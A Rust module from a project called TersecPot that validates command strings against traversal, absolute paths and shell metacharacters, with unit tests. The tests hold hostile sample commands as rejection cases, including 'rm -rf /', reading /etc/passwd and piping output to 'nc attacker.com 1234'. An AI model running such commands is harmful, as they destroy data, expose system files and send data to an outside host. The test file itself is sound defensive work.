//! Input validation for TersecPot commands
//!
//! This module provides security-focused validation for command inputs.

use crate::error::{Result, TersecError};

/// Maximum allowed command length in bytes
pub const MAX_COMMAND_LENGTH: usize = 1024;

/// Validates a command string for security issues
///
/// # Errors
///
/// Returns `TersecError::Validation` if:
/// - Command exceeds `MAX_COMMAND_LENGTH`
/// - Command contains path traversal patterns (`..`, absolute paths)
/// - Command contains potentially dangerous shell characters
///
/// # Examples
///
/// ```
/// use shared::validation::validate_command;
///
/// // Valid command
/// assert!(validate_command("echo hello").is_ok());
///
/// // Invalid - too long
/// let long_cmd = "a".repeat(2000);
/// assert!(validate_command(&long_cmd).is_err());
///
/// // Invalid - path traversal
/// assert!(validate_command("cat ../../etc/passwd").is_err());
/// ```
pub fn validate_command(cmd: &str) -> Result<()> {
    // Length check
    if cmd.len() > MAX_COMMAND_LENGTH {
        return Err(TersecError::Validation(format!(
            "Command exceeds maximum length of {} bytes (got {} bytes)",
            MAX_COMMAND_LENGTH,
            cmd.len()
        )));
    }

    // Empty command check
    if cmd.trim().is_empty() {
        return Err(TersecError::Validation(
            "Command cannot be empty".to_string(),
        ));
    }

    // Path traversal detection
    if cmd.contains("..") {
        return Err(TersecError::Validation(
            "Path traversal pattern detected (..)".to_string(),
        ));
    }

    // Absolute path detection (potential security risk)
    if cmd.starts_with('/') && !cmd.starts_with("#TERSEC_META:") {
        return Err(TersecError::Validation(
            "Absolute paths are not allowed".to_string(),
        ));
    }

    // Shell injection detection - dangerous characters
    // Note: We allow $ for metadata but check context
    let dangerous_patterns = [
        ("`", "backticks"),
        ("|", "pipe"),
        ("&", "ampersand"),
        (";", "semicolon"),
        ("\n;", "newline with semicolon"),
        ("\n|", "newline with pipe"),
        ("\n&", "newline with ampersand"),
    ];

    for (pattern, name) in &dangerous_patterns {
        if cmd.contains(pattern) {
            // Allow in metadata section
            if let Some(meta_end) = cmd.find('\n') {
                let after_meta = &cmd[meta_end..];
                if after_meta.contains(pattern) {
                    return Err(TersecError::Validation(format!(
                        "Potentially dangerous character detected: {}",
                        name
                    )));
                }
            } else if cmd.contains(pattern) {
                return Err(TersecError::Validation(format!(
                    "Potentially dangerous character detected: {}",
                    name
                )));
            }
        }
    }

    Ok(())
}

/// Validates command metadata format
///
/// # Errors
///
/// Returns `TersecError::Validation` if metadata is malformed
pub fn validate_metadata(metadata_json: &str) -> Result<()> {
    // Basic JSON structure validation
    if !metadata_json.starts_with('{') || !metadata_json.ends_with('}') {
        return Err(TersecError::Validation(
            "Metadata must be a valid JSON object".to_string(),
        ));
    }

    // Length check for metadata
    if metadata_json.len() > 512 {
        return Err(TersecError::Validation(
            "Metadata exceeds maximum length of 512 bytes".to_string(),
        ));
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_command() {
        assert!(validate_command("echo hello").is_ok());
        assert!(validate_command("ls -la").is_ok());
        assert!(validate_command("systemctl status nginx").is_ok());
    }

    #[test]
    fn test_valid_command_with_metadata() {
        let cmd = "#TERSEC_META:{\"role\":\"DevOps\",\"operation\":\"test\"}\necho hello";
        assert!(validate_command(cmd).is_ok());
    }

    #[test]
    fn test_oversized_command() {
        let long_cmd = "a".repeat(MAX_COMMAND_LENGTH + 1);
        let result = validate_command(&long_cmd);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("exceeds maximum length"));
    }

    #[test]
    fn test_empty_command() {
        assert!(validate_command("").is_err());
        assert!(validate_command("   ").is_err());
    }

    #[test]
    fn test_path_traversal() {
        assert!(validate_command("cat ../../etc/passwd").is_err());
        assert!(validate_command("ls ../../../").is_err());
    }

    #[test]
    fn test_absolute_path() {
        assert!(validate_command("/bin/rm -rf /").is_err());
        assert!(validate_command("/etc/passwd").is_err());
    }

    #[test]
    fn test_shell_injection() {
        assert!(validate_command("echo test; rm -rf /").is_err());
        assert!(validate_command("echo test | nc attacker.com 1234").is_err());
        assert!(validate_command("echo test & malicious_command").is_err());
        assert!(validate_command("echo `whoami`").is_err());
    }

    #[test]
    fn test_metadata_validation() {
        assert!(validate_metadata("{\"role\":\"admin\"}").is_ok());
        assert!(validate_metadata("not json").is_err());
        assert!(validate_metadata(&"a".repeat(600)).is_err());
    }
}
